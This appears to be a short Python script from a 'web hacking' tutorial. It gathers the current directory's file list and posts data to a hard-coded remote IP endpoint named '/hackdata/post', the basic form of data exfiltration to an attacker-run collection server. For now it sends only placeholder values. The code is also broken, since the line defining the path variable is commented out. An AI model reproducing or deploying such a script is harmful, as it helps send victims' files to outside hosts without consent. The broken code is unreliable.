# Web hacking and security
# EP.0 - Overview

# pip install requests
import os
import requests

# path = os.getcwd()
fileList = str(os.listdir(path))
# print(path, fileList)
apiURL = 'http://104.248.39.146:8888/hackdata/post'
data = {
		"source":"SomeSource",
		"data":"SomeData"
	}
r = requests.post(url=apiURL, data=data)
print(r.text)
print(r.status_code)